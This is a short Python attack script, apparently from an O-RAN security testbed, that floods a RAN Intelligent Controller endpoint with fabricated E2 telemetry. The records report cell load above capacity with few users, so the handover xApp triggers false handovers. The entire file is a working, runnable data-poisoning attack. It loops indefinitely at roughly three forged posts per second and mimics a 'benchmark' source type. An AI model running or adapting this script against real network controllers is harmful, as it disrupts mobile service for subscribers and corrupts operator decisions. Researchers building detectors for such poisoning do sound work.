"""
ataque_overload_fabricate.py - Ataque de Fabricação de Sobrecarga (xApp)
Alvo: Decisão de Handover do xApp via interface E2
Efeito: Envenena dados de telemetria com cell_load_mbps >200 e capacity=100,
        forçando HANDOVER mesmo em células com poucos usuários.
"""

import threading
import urllib.request
import json
import time
import random
import sys

RIC_HOST = sys.argv[1] if len(sys.argv) > 1 else "ric-service"
RIC_PORT = sys.argv[2] if len(sys.argv) > 2 else "8080"
BASE_URL = f"http://{RIC_HOST}:{RIC_PORT}"

print("=" * 60)
print("  ATAQUE: OVERLOAD FABRICATE (xApp)")
print(f"  Alvo: {BASE_URL}")
print("  Forca HANDOVER falso injetando load > 200 Mbps")
print("=" * 60)

# Lista de status possiveis para parecer variado
STATUS_LIST = ["overload", "overload", "overload", "critical"]

def ataque_overload_fabricate():
    """Envenena metricas de telemetria E2 com carga falsa"""
    while True:
        try:
            ataque = {
                "id": f"worker-comp-{random.randint(100, 999)}",
                "latency_ms": round(random.uniform(1, 5), 2),  # Latencia baixa (nao suspeita)
                "type": "benchmark",
                "cell_load_mbps": random.randint(220, 300),    # Load FALSO (>200!)
                "cell_capacity_mbps": 100,                      # Capacity fixo em 100
                "connected_users": random.randint(5, 20),       # Poucos usuarios (inconsistente)
                "status": random.choice(STATUS_LIST),
                "cell_id": f"gnb-{random.randint(1, 10):03d}",
                "timestamp": time.time()
            }
            
            data = json.dumps(ataque).encode()
            req = urllib.request.Request(BASE_URL, data=data, method="POST")
            req.add_header('Content-Type', 'application/json')
            with urllib.request.urlopen(req, timeout=2): pass
            
            time.sleep(0.3)  # ~3 ataques/s
            
        except Exception as e:
            print(f"[OverloadFabricate] Erro: {e}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        ataque_overload_fabricate()
    except KeyboardInterrupt:
        print("\n[!] Ataque interrompido pelo operador")
        sys.exit(0)